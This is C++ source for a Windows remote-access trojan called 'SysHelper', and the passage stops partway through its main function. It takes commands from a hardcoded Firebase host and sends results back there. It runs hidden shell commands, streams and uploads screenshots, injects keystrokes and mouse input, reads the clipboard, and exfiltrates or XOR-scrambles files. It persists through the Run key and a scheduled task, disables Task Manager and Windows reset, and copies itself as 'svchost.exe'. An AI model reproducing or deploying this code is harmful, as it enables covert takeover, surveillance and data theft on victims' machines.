#include <windows.h>
#include <winhttp.h>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <mmsystem.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
using namespace std;
using namespace Gdiplus;

#define BUFSZ 65536
#define AGENT_NAME "SysHelper"
#define HOST L"lucaaverij-default-rtdb.europe-west1.firebasedatabase.app"

static string g_host, g_ip;
static int g_mon = 0;
static float g_scale = 0.5f;
static int g_quality = 25;

static string json_escape(const string& s) {
    string r;
    for (unsigned char c : s) {
        if (c == '"' || c == '\\') { r += '\\'; r += c; }
        else if (c == '\n') r += "\\n";
        else if (c == '\r') r += "\\r";
        else if (c == '\t') r += "\\t";
        else if (c < 32) { char h[8]; snprintf(h, 8, "\\u%04X", c); r += h; }
        else r += c;
    }
    return r;
}

static string fb_escape(const string& s) {
    string r;
    for (char c : s) {
        if (strchr(".#$[]", c)) { char h[8]; snprintf(h, 8, "%%%02X", (unsigned char)c); r += h; }
        else r += c;
    }
    return r;
}

static string jget(const string& j, const string& k) {
    string p = "\"" + k + "\":\"";
    size_t q = j.find(p);
    if (q == string::npos) { p = "\"" + k + "\":"; q = j.find(p); if (q == string::npos) return ""; }
    q += p.size();
    if (q < j.size() && j[q] == '"') q++;
    string r; bool esc = false;
    for (; q < j.size(); q++) {
        if (esc) { if (j[q] == 'n') r += '\n'; else if (j[q] == 'r') r += '\r'; else if (j[q] == 't') r += '\t'; else r += j[q]; esc = false; continue; }
        if (j[q] == '\\') { esc = true; continue; }
        if (j[q] == '"') break;
        r += j[q];
    }
    return r;
}

static string b64_encode(const unsigned char* data, size_t len) {
    static const char T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    string r; r.reserve((len + 2) / 3 * 4);
    for (size_t i = 0; i < len; i += 3) {
        unsigned v = ((unsigned)data[i] << 16) | (i + 1 < len ? (unsigned)data[i+1] << 8 : 0) | (i + 2 < len ? data[i+2] : 0);
        r += T[(v>>18)&0x3F]; r += T[(v>>12)&0x3F];
        r += (i+1<len) ? T[(v>>6)&0x3F] : '=';
        r += (i+2<len) ? T[v&0x3F] : '=';
    }
    return r;
}

static string b64_decode(const string& s) {
    auto val = [](char c)->int {
        if (c>='A'&&c<='Z') return c-'A';
        if (c>='a'&&c<='z') return c-'a'+26;
        if (c>='0'&&c<='9') return c-'0'+52;
        if (c=='+') return 62; if (c=='/') return 63; return -1;
    };
    string o; int v = -2, bits = 0;
    for (char c : s) {
        if (c == '=') break;
        int x = val(c); if (x < 0) continue;
        if (v == -2) { v = x; bits = 6; }
        else { v = (v << 6) | x; bits += 6; if (bits >= 8) { bits -= 8; o += (char)((v >> bits) & 0xFF); } }
    }
    return o;
}

static string http_req(const wchar_t* method, const string& path, const string& body = "", bool no_body = false) {
    static HINTERNET sess = 0;
    if (!sess) sess = WinHttpOpen(L"S", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!sess) return "";
    for (int a = 0; a < 3; a++) {
        HINTERNET conn = WinHttpConnect(sess, HOST, 443, 0);
        if (!conn) continue;
        HINTERNET req = WinHttpOpenRequest(conn, method, wstring(path.begin(), path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
        if (!req) { WinHttpCloseHandle(conn); continue; }
        DWORD ssl = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &ssl, sizeof(ssl));
        bool ok;
        if (no_body) ok = WinHttpSendRequest(req, 0, 0, 0, 0, 0, 0);
        else ok = WinHttpSendRequest(req, L"Content-Type: application/json\r\n", -1, (void*)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
        if (ok && WinHttpReceiveResponse(req, 0)) {
            string out; char buf[1024]; DWORD rd;
            while (WinHttpReadData(req, buf, 1023, &rd) && rd) { buf[rd] = 0; out += buf; }
            WinHttpCloseHandle(req); WinHttpCloseHandle(conn);
            return out;
        }
        WinHttpCloseHandle(req); WinHttpCloseHandle(conn);
        Sleep(200);
    }
    return "";
}

static void run_hidden(const string& cmd) {
    STARTUPINFOA si = {sizeof(si)}; PROCESS_INFORMATION pi;
    string c = cmd;
    if (CreateProcessA(0, &c[0], 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &si, &pi)) {
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

static string run_cmd(const string& cmd) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, TRUE};
    HANDLE rr = 0, rw = 0;
    CreatePipe(&rr, &rw, &sa, 0);
    STARTUPINFOA si = {sizeof(si)}; si.dwFlags = STARTF_USESTDHANDLES; si.hStdOutput = rw; si.hStdError = rw;
    PROCESS_INFORMATION pi;
    string full = "cmd.exe /c " + cmd;
    if (!CreateProcessA(0, &full[0], 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &si, &pi)) {
        CloseHandle(rr); CloseHandle(rw); return "error";
    }
    CloseHandle(pi.hThread);
    string out; char buf[256]; DWORD n;
    while (ReadFile(rr, buf, 255, &n, 0) && n) { buf[n] = 0; out += buf; }
    CloseHandle(rw); CloseHandle(rr);
    WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess);
    return out;
}

static string get_ip() {
    auto s = WinHttpOpen(L"", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "0.0.0.0";
    auto c = WinHttpConnect(s, L"api.ipify.org", 80, 0);
    if (!c) { WinHttpCloseHandle(s); return "0.0.0.0"; }
    auto r = WinHttpOpenRequest(c, L"GET", L"/", 0, 0, 0, 0);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "0.0.0.0"; }
    WinHttpSendRequest(r, 0, 0, 0, 0, 0, 0); WinHttpReceiveResponse(r, 0);
    string o; char buf[256]; DWORD n;
    while (WinHttpReadData(r, buf, 255, &n) && n) { buf[n] = 0; o += buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return (o.empty() || o[0] == '{') ? "0.0.0.0" : o;
}

static string timestamp() {
    SYSTEMTIME s; GetLocalTime(&s);
    char b[32]; snprintf(b, 32, "%04d-%02d-%02dT%02d:%02d:%02d", s.wYear, s.wMonth, s.wDay, s.wHour, s.wMinute, s.wSecond);
    return b;
}

static CLSID* jpeg_codec() {
    static CLSID c; static bool got = false;
    if (!got) {
        UINT n, sz; GetImageEncodersSize(&n, &sz);
        if (sz) {
            auto* p = (Gdiplus::ImageCodecInfo*)malloc(sz);
            if (p) { GetImageEncoders(n, sz, p); for (UINT i = 0; i < n; i++) { if (!wcscmp(p[i].MimeType, L"image/jpeg")) { c = p[i].Clsid; got = true; break; } } free(p); }
        }
    }
    return got ? &c : 0;
}

struct Monitor { int x, y, w, h; };
static vector<Monitor> g_mons;
static BOOL CALLBACK mon_enum(HMONITOR, HDC, LPRECT r, LPARAM) {
    g_mons.push_back({r->left, r->top, r->right-r->left, r->bottom-r->top});
    return 1;
}

static string capture_screen(int monitor, float scale, int quality) {
    static HBITMAP canvas = 0; static int cw = 0, ch = 0;
    static GdiplusStartupInput gsi; static ULONG_PTR token; static bool init = false;
    if (!init) { GdiplusStartup(&token, &gsi, 0); init = true; }

    g_mons.clear();
    EnumDisplayMonitors(0, 0, mon_enum, 0);
    int ox = 0, oy = 0, sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    if (monitor >= 0 && monitor < (int)g_mons.size()) { ox = g_mons[monitor].x; oy = g_mons[monitor].y; sw = g_mons[monitor].w; sh = g_mons[monitor].h; }
    int dw = max(1, (int)(sw * scale)), dh = max(1, (int)(sh * scale));
    if (!canvas || cw < dw || ch < dh) { if (canvas) DeleteObject(canvas); HDC dc = GetDC(0); canvas = CreateCompatibleBitmap(dc, dw, dh); cw = dw; ch = dh; ReleaseDC(0, dc); }
    HDC dc = GetDC(0), mc = CreateCompatibleDC(dc);
    SelectObject(mc, canvas);
    SetStretchBltMode(mc, HALFTONE);
    StretchBlt(mc, 0, 0, dw, dh, dc, ox, oy, sw, sh, SRCCOPY);
    DeleteDC(mc); ReleaseDC(0, dc);

    Gdiplus::Bitmap bmp(canvas, (HPALETTE)0);
    CLSID* codec = jpeg_codec();
    if (!codec) return "";
    IStream* st = 0;
    if (CreateStreamOnHGlobal(0, TRUE, &st) != S_OK) return "";
    EncoderParameters ep; ep.Count = 1; ep.Parameter[0].Guid = Gdiplus::EncoderQuality; ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    UINT qv = quality; ep.Parameter[0].NumberOfValues = 1; ep.Parameter[0].Value = &qv;
    bmp.Save(st, codec, &ep);
    HGLOBAL hg; GetHGlobalFromStream(st, &hg);
    size_t sz = GlobalSize(hg); char* p = (char*)GlobalLock(hg);
    string result = b64_encode((unsigned char*)p, sz);
    GlobalUnlock(hg); st->Release();
    return result;
}

static void do_mouse(int x, int y, const string& action) {
    SetCursorPos(x, y);
    if (action == "click" || action == "left" || action == "down") {
        if (action == "down") mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        else { mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); Sleep(30); mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); }
    } else if (action == "right" || action == "right_down") {
        if (action == "right_down") mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
        else { mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0); Sleep(30); mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0); }
    } else if (action == "up") mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    else if (action == "right_up") mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
    else if (action == "double") { for (int i = 0; i < 2; i++) { mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); Sleep(30); mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); Sleep(30); } }
    else if (action == "move") {}
    else if (action == "scroll") {}
}

static void do_keys(const string& s) {
    for (char c : s) {
        INPUT in = {INPUT_KEYBOARD}; WORD vk = VkKeyScanA(c);
        bool sh = (vk & 0x100) != 0;
        if (sh) { in.ki.wVk = VK_SHIFT; in.ki.dwFlags = 0; SendInput(1, &in, sizeof(in)); }
        in.ki.wVk = vk & 0xFF; in.ki.dwFlags = 0; SendInput(1, &in, sizeof(in));
        in.ki.dwFlags = KEYEVENTF_KEYUP; SendInput(1, &in, sizeof(in));
        if (sh) { in.ki.wVk = VK_SHIFT; in.ki.dwFlags = KEYEVENTF_KEYUP; SendInput(1, &in, sizeof(in)); }
        Sleep(10);
    }
}

static string file_xor(const string& path) {
    FILE* f = fopen(path.c_str(), "rb");
    if (!f) return "error";
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);
    string d(sz, 0); fread(&d[0], 1, sz, f); fclose(f);
    for (long i = 0; i < sz; i++) d[i] ^= 0xFF;
    f = fopen(path.c_str(), "wb"); fwrite(d.data(), 1, sz, f); fclose(f);
    return "ok";
}

typedef string (*cmd_fn)(const string&);
struct cmd_entry { const char* name; cmd_fn fn; };

static string h_cmd(const string& p) { return run_cmd(p.empty() ? "whoami" : p); }
static string h_ps(const string& p) { return run_cmd("powershell -c " + p); }
static string h_ss(const string& p) { return capture_screen(p.empty() ? 0 : atoi(p.c_str()), 1.0f, 90); }
static string h_screen(const string& p) { return capture_screen(g_mon, g_scale, g_quality); }
static string h_mouse(const string& p) { int x, y; char a[32] = "move"; if (sscanf(p.c_str(), "%d,%d,%31s", &x, &y, a) < 2) return "bad"; do_mouse(x, y, a); return "ok"; }
static string h_keys(const string& p) { do_keys(p); return "ok"; }

static string h_file_list(const string& p) {
    string dir = p.empty() ? "." : p;
    if (dir.back() != '\\') dir += '\\';
    string out = "[";
    WIN32_FIND_DATAA fd; HANDLE h = FindFirstFileA((dir + "*").c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (out.size() > 1) out += ",";
            out += "{\"n\":\"" + json_escape(fd.cFileName) + "\",\"s\":" + to_string(fd.nFileSizeLow) + ",\"d\":" + (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ? "true" : "false") + "}";
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    return out + "]";
}

static string h_file_del(const string& p) { SetFileAttributesA(p.c_str(), FILE_ATTRIBUTE_NORMAL); return DeleteFileA(p.c_str()) ? "ok" : "error"; }
static string h_file_ren(const string& p) { size_t sp = p.find("|||"); if (sp == string::npos) return "bad"; return MoveFileA(p.substr(0,sp).c_str(), p.substr(sp+3).c_str()) ? "ok" : "error"; }
static string h_file_enc(const string& p) { return file_xor(p); }
static string h_file_dec(const string& p) { return file_xor(p); }

static string h_file_upload(const string& p) {
    size_t sp = p.find("|||"); if (sp == string::npos) return "bad";
    string dec = b64_decode(p.substr(sp + 3));
    FILE* f = fopen(p.substr(0, sp).c_str(), "wb");
    if (!f) return "error";
    fwrite(dec.data(), 1, dec.size(), f); fclose(f);
    return "ok";
}

static string h_file_download(const string& p) {
    FILE* f = fopen(p.c_str(), "rb");
    if (!f) return "error";
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);
    string d(sz, 0); fread(&d[0], 1, sz, f); fclose(f);
    return b64_encode((unsigned char*)d.data(), sz);
}

static string h_proc_list(const string& p) {
    string out = "[";
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(sn, &pe)) {
            do { if (out.size() > 1) out += ","; out += "{\"n\":\"" + json_escape(pe.szExeFile) + "\",\"p\":" + to_string(pe.th32ProcessID) + "}"; } while (Process32Next(sn, &pe));
        }
        CloseHandle(sn);
    }
    return out + "]";
}

static string h_sys_info(const string& p) {
    char u[64]; DWORD us = sizeof(u); GetUserNameA(u, &us);
    OSVERSIONINFOA oi = {sizeof(oi)}; GetVersionExA(&oi);
    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
    char b[4096]; snprintf(b, 4096, "PC: %s\nIP: %s\nTime: %s\nUser: %s\nOS: %lu.%lu\nRAM: %lluMB", g_host.c_str(), g_ip.c_str(), timestamp().c_str(), u, oi.dwMajorVersion, oi.dwMinorVersion, ms.ullTotalPhys/1024/1024);
    return string(b);
}

static string h_kill(const string& p) {
    DWORD pid = atol(p.c_str());
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) return "error";
    TerminateProcess(h, 1); CloseHandle(h); return "ok";
}

static string h_kill_name(const string& p) {
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(sn, &pe)) {
            do { if (!_stricmp(pe.szExeFile, p.c_str())) { HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID); if (h) { TerminateProcess(h, 1); CloseHandle(h); } } } while (Process32Next(sn, &pe));
        }
        CloseHandle(sn);
    }
    return "ok";
}

static string h_shutdown(const string& p) { run_hidden("shutdown /s /t 0"); return "ok"; }
static string h_restart(const string& p) { run_hidden("shutdown /r /t 0"); return "ok"; }
static string h_lock(const string& p) { LockWorkStation(); return "ok"; }
static string h_logoff(const string& p) { run_hidden("shutdown /l"); return "ok"; }

static string h_msgbox(const string& p) {
    string text = jget(p, "text"); string title = jget(p, "title");
    if (title.empty()) title = "Remote";
    MessageBoxA(0, text.empty() ? p.c_str() : text.c_str(), title.c_str(), MB_OK);
    return "ok";
}

static string h_volume(const string& p) {
    int v = atoi(p.c_str()); if (v < 0 || v > 100) return "bad";
    DWORD w = (DWORD)(v * 65535 / 100); waveOutSetVolume(0, (w << 16) | w);
    return "ok";
}

static string h_clip_read(const string& p) {
    string o;
    if (OpenClipboard(0)) { HANDLE h = GetClipboardData(CF_TEXT); if (h) { char* cp = (char*)GlobalLock(h); if (cp) { o = cp; GlobalUnlock(h); } } CloseClipboard(); }
    return o.empty() ? "empty" : o;
}

static string h_clip_write(const string& p) {
    if (OpenClipboard(0)) { EmptyClipboard(); HGLOBAL h = GlobalAlloc(GMEM_MOVEABLE, p.size()+1); if (h) { memcpy(GlobalLock(h), p.data(), p.size()+1); GlobalUnlock(h); SetClipboardData(CF_TEXT, h); } CloseClipboard(); }
    return "ok";
}

static string h_idle(const string& p) { LASTINPUTINFO li = {sizeof(li)}; GetLastInputInfo(&li); return to_string((GetTickCount()-li.dwTime)/1000); }
static string h_uptime(const string& p) { return to_string(GetTickCount64()/1000); }

static string h_net_info(const string& p) {
    string o;
    IP_ADAPTER_INFO ai[16]; DWORD sz = sizeof(ai);
    if (GetAdaptersInfo(ai, &sz) == NO_ERROR)
        for (auto* a = ai; a; a = a->Next) { char b[1024]; snprintf(b, 1024, "%s: %s\n", a->Description, a->IpAddressList.IpAddress.String); o += b; }
    return o;
}

static string h_svc_ctrl(const string& p) {
    char a[32], n[512]; if (sscanf(p.c_str(), "%31s %511[^\n]", a, n) < 1) return "bad";
    return run_cmd(string("sc ") + a + " \"" + n + "\"");
}

static string h_reg_read(const string& p) {
    char hk[16], sp[512], vn[256];
    if (sscanf(p.c_str(), "%15s %511[^|]|||%255[^\n]", hk, sp, vn) < 3) return "bad";
    HKEY rh = (!_stricmp(hk, "HKLM")) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    HKEY h; if (RegOpenKeyExA(rh, sp, 0, KEY_READ, &h) != ERROR_SUCCESS) return "not_found";
    DWORD t = 0, sz = 0; RegQueryValueExA(h, vn, 0, &t, 0, &sz);
    string o(sz, 0); RegQueryValueExA(h, vn, 0, &t, (BYTE*)&o[0], &sz); RegCloseKey(h);
    o.resize(strlen(o.c_str()));
    return o;
}

static string h_reg_write(const string& p) {
    char hk[16], sp[512], vn[256], vv[1024];
    if (sscanf(p.c_str(), "%15s %511[^|]|||%255[^|]|||%1023[^\n]", hk, sp, vn, vv) < 4) return "bad";
    HKEY rh = (!_stricmp(hk, "HKLM")) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    HKEY h; if (RegCreateKeyExA(rh, sp, 0, 0, 0, KEY_SET_VALUE, 0, &h, 0) != ERROR_SUCCESS) return "error";
    RegSetValueExA(h, vn, 0, REG_SZ, (BYTE*)vv, (DWORD)strlen(vv)+1); RegCloseKey(h);
    return "ok";
}

static string h_reg_del(const string& p) {
    char hk[16], sp[512], vn[256];
    if (sscanf(p.c_str(), "%15s %511[^|]|||%255[^\n]", hk, sp, vn) < 3) return "bad";
    HKEY rh = (!_stricmp(hk, "HKLM")) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    HKEY h; if (RegOpenKeyExA(rh, sp, 0, KEY_SET_VALUE, &h) != ERROR_SUCCESS) return "not_found";
    RegDeleteValueA(h, vn); RegCloseKey(h);
    return "ok";
}

static string h_dl_url(const string& p) {
    size_t sp = p.find("|||"); if (sp == string::npos) return "bad";
    return run_cmd("powershell -c \"Invoke-WebRequest -Uri '" + p.substr(0,sp) + "' -OutFile '" + p.substr(sp+3) + "'\"");
}

static string h_file_copy(const string& p) {
    size_t sp = p.find("|||"); if (sp == string::npos) return "bad";
    return CopyFileA(p.substr(0,sp).c_str(), p.substr(sp+3).c_str(), FALSE) ? "ok" : "error";
}

static string h_dir_create(const string& p) { return CreateDirectoryA(p.c_str(), 0) ? "ok" : "error"; }

static string h_host_info(const string& p) {
    char b[64]; DWORD bs = sizeof(b);
    GetComputerNameA(b, &bs); string o = "PC:" + string(b) + "\n";
    bs = sizeof(b); GetUserNameA(b, &bs); o += "User:" + string(b) + "\nIP:" + g_ip + "\n";
    return o;
}

static string h_startup_on(const string& p) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        char ep[MAX_PATH]; DWORD l = GetModuleFileNameA(0, ep, MAX_PATH); if (l) RegSetValueExA(hk, AGENT_NAME, 0, REG_SZ, (BYTE*)ep, l+1); RegCloseKey(hk);
    }
    char ep2[MAX_PATH]; if (GetModuleFileNameA(0, ep2, MAX_PATH) > 0) {
        char s[2048]; snprintf(s, 2048, "cmd.exe /c schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f 2>nul", AGENT_NAME, ep2); run_hidden(s);
    }
    return "ok";
}

static string h_startup_off(const string& p) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) { RegDeleteValueA(hk, AGENT_NAME); RegCloseKey(hk); }
    char s[256]; snprintf(s, 256, "schtasks /delete /tn \"%s\" /f 2>nul", AGENT_NAME); run_hidden(s);
    return "ok";
}

static string h_taskmgr_on(const string& p) {
    HKEY hk; if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, 0, KEY_SET_VALUE, 0, &hk, 0) == ERROR_SUCCESS) { DWORD v = 1; RegSetValueExA(hk, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v)); RegCloseKey(hk); }
    return "ok";
}

static string h_taskmgr_off(const string& p) {
    HKEY hk; if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, 0, KEY_SET_VALUE, 0, &hk, 0) == ERROR_SUCCESS) { RegDeleteValueA(hk, "DisableTaskMgr"); RegCloseKey(hk); }
    return "ok";
}

static string h_reset_on(const string& p) {
    run_hidden("reagentc /disable 2>nul");
    HKEY hk; if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, 0, 0, KEY_SET_VALUE, 0, &hk, 0) == ERROR_SUCCESS) { DWORD v = 1; RegSetValueExA(hk, "DisableReset", 0, REG_DWORD, (BYTE*)&v, sizeof(v)); RegCloseKey(hk); }
    return "ok";
}

static string h_reset_off(const string& p) {
    run_hidden("reagentc /enable 2>nul");
    HKEY hk; if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, 0, 0, KEY_SET_VALUE, 0, &hk, 0) == ERROR_SUCCESS) { RegDeleteValueA(hk, "DisableReset"); RegCloseKey(hk); }
    return "ok";
}

static string h_uninstall(const string& p) {
    HKEY hk; if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) { RegDeleteValueA(hk, AGENT_NAME); RegCloseKey(hk); }
    char s[256]; snprintf(s, 256, "schtasks /delete /tn \"%s\" /f 2>nul", AGENT_NAME); run_hidden(s);
    char ep[MAX_PATH]; GetModuleFileNameA(0, ep, MAX_PATH);
    char c[BUFSZ]; snprintf(c, BUFSZ, "cmd.exe /c timeout /t 2 & del /f /q \"%s\"", ep);
    STARTUPINFOA si = {sizeof(si)}; PROCESS_INFORMATION pi;
    CreateProcessA(0, c, 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    ExitProcess(0);
    return "ok";
}

static string h_wallpaper(const string& p) { return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)p.c_str(), SPIF_UPDATEINIFILE) ? "ok" : "error"; }

static string h_ss_all(const string& p) {
    string o = "[";
    g_mons.clear();
    EnumDisplayMonitors(0, 0, mon_enum, 0);
    for (size_t i = 0; i < g_mons.size(); i++) {
        if (o.size() > 1) o += ",";
        o += "\"" + json_escape(capture_screen((int)i, 1.0f, 90)) + "\"";
    }
    return o + "]";
}

static string h_live_cfg(const string& p) {
    string v = jget(p, "quality"); if (!v.empty()) { int x = atoi(v.c_str()); if (x >= 1 && x <= 100) g_quality = x; }
    v = jget(p, "scale"); if (!v.empty()) { float x = (float)atof(v.c_str()); if (x >= 0.1f && x <= 1.0f) g_scale = x; }
    v = jget(p, "monitor"); if (!v.empty()) { int x = atoi(v.c_str()); if (x >= 0) g_mon = x; }
    return "ok";
}

static string h_live_mon(const string& p) {
    if (!p.empty()) { int x = atoi(p.c_str()); if (x >= 0) g_mon = x; }
    return "ok:" + to_string(g_mon);
}

static cmd_entry commands[] = {
    {"cmd", h_cmd}, {"powershell", h_ps}, {"screenshot", h_ss}, {"screen", h_screen},
    {"mouse", h_mouse}, {"keyboard", h_keys},
    {"file_list", h_file_list}, {"file_delete", h_file_del}, {"file_rename", h_file_ren},
    {"file_encrypt", h_file_enc}, {"file_decrypt", h_file_dec},
    {"file_upload", h_file_upload}, {"file_download", h_file_download},
    {"process_list", h_proc_list}, {"system_info", h_sys_info},
    {"kill_process", h_kill}, {"process_kill_name", h_kill_name},
    {"shutdown", h_shutdown}, {"restart", h_restart}, {"lock", h_lock}, {"logoff", h_logoff},
    {"msgbox", h_msgbox}, {"volume", h_volume},
    {"clipboard", h_clip_read}, {"clipboard_write", h_clip_write},
    {"idle", h_idle}, {"uptime", h_uptime},
    {"network_info", h_net_info}, {"service_control", h_svc_ctrl},
    {"registry_read", h_reg_read}, {"registry_write", h_reg_write}, {"registry_delete", h_reg_del},
    {"download_url", h_dl_url}, {"file_copy", h_file_copy}, {"dir_create", h_dir_create},
    {"host_info", h_host_info},
    {"startup_on", h_startup_on}, {"startup_off", h_startup_off},
    {"taskmgr_on", h_taskmgr_on}, {"taskmgr_off", h_taskmgr_off},
    {"reset_on", h_reset_on}, {"reset_off", h_reset_off},
    {"uninstall", h_uninstall}, {"wallpaper", h_wallpaper},
    {"screenshot_all", h_ss_all}, {"live_config", h_live_cfg}, {"live_monitor", h_live_mon},
    {0, 0}
};

static string dispatch(const string& type, const string& payload) {
    for (int i = 0; commands[i].name; i++) {
        if (type == commands[i].name) {
            try { return commands[i].fn(payload); } catch (...) { return "error"; }
        }
    }
    return "unknown";
}

static void poll_thread(void*) {
    Sleep(2000);
    int beat = 0;
    while (true) {
        Sleep(100);
        try {
            if (++beat >= 300) {
                beat = 0;
                string path = fb_escape(g_host);
                http_req(L"PUT", "/pings/" + path + ".json", "{\"ts\":\"" + timestamp() + "\",\"ip\":\"" + json_escape(g_ip) + "\"}");
            }
            string path = fb_escape(g_host);
            string raw = http_req(L"GET", "/commands/" + path + ".json");
            if (raw.empty() || raw == "null" || raw.size() < 5) continue;
            size_t pos = 0;
            while ((pos = raw.find("\":{", pos)) != string::npos) {
                size_t ks = raw.rfind('"', pos - 1);
                if (ks == string::npos) { pos++; continue; }
                string id = raw.substr(ks + 1, pos - ks - 1);
                size_t os = pos + 3; int d = 1; size_t oe = os;
                while (d > 0 && oe < raw.size()) { if (raw[oe] == '{') d++; if (raw[oe] == '}') d--; oe++; }
                if (d) break;
                string inner = raw.substr(os, oe - os - 1);
                string type = jget(inner, "type");
                string payload = jget(inner, "payload");
                string status = jget(inner, "status");
                if (!type.empty() && status == "pending") {
                    string result = dispatch(type, payload);
                    http_req(L"PATCH", "/commands/" + path + "/" + id + ".json",
                        "{\"status\":\"done\",\"result\":\"" + json_escape(result) + "\"}");
                }
                pos = oe;
            }
            string ri = http_req(L"GET", "/input/" + path + ".json");
            if (!ri.empty() && ri != "null" && ri.size() > 5) {
                bool hit = false; pos = 0;
                while ((pos = ri.find("\":{", pos)) != string::npos) {
                    size_t os = pos + 3; int d = 1; size_t oe = os;
                    while (d > 0 && oe < ri.size()) { if (ri[oe] == '{') d++; if (ri[oe] == '}') d--; oe++; }
                    if (d) break;
                    string inner = ri.substr(os, oe - os - 1);
                    string type = jget(inner, "type");
                    string payload = jget(inner, "payload");
                    if (type == "mouse") { int x, y; char a[32] = "move"; if (sscanf(payload.c_str(), "%d,%d,%31s", &x, &y, a) >= 2) { do_mouse(x, y, a); hit = true; } }
                    else if (type == "keyboard") { do_keys(payload); hit = true; }
                    pos = oe;
                }
                if (hit) http_req(L"DELETE", "/input/" + path + ".json");
            }
        } catch (...) {}
    }
}

static void screen_thread(void*) {
    Sleep(2000);
    while (true) {
        DWORD start = GetTickCount();
        try {
            string img = capture_screen(g_mon, g_scale, g_quality);
            if (!img.empty()) {
                string path = fb_escape(g_host);
                http_req(L"PUT", "/live/" + path + ".json",
                    "{\"r\":\"" + json_escape(img) + "\",\"t\":\"" + timestamp() + "\",\"q\":" + to_string(g_quality) + ",\"s\":" + to_string(g_scale) + "}");
            }
        } catch (...) {}
        DWORD elapsed = GetTickCount() - start;
        if (elapsed < 100) Sleep(100 - elapsed);
    }
}

int main(int argc, char* argv[]) {
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    SetErrorMode(SEM_NOGPFAULTERRORBOX);

    bool no_screen = false;
    for (int i = 1; i < argc; i++) if (!strcmp(argv[i], "--no-screen")) no_screen = true;

    char buf[64]; DWORD sz = sizeof(buf);
    g_host = GetComputerNameA(buf, &sz) ? buf : "unknown";

    char cur[MAX_PATH]; DWORD l = GetModuleFileNameA(0, cur, MAX_PATH);
    if (l && l < MAX_PATH) {
        string dst = string(getenv("APPDATA")) + "\\svchost.exe";
        string old = string(getenv("LOCALAPPDATA")) + "\\svchost.exe";
